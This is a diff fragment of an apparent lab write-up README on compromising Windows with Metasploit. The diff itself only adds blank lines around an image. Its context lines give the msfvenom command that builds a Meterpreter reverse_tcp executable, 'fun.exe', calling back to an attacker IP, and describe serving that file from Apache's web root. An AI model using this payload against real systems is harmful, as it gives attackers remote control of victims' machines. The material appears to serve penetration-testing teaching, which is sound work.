@@ -25,7 +25,9 @@ Find the attackers ip address using ifconfig
 
 # OUTPUT:
 Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+
 ![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/b9eb08be-ee84-48f6-9b95-f75a5ef4c10a)
+
 copy the fun.exe into the apache /var/www/html folder
 ![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/32f0f4c0-bd07-48f6-b56b-c6d93b4ed080)
 Start apache server sudo systemctl apache2 start and Check the status of apache2
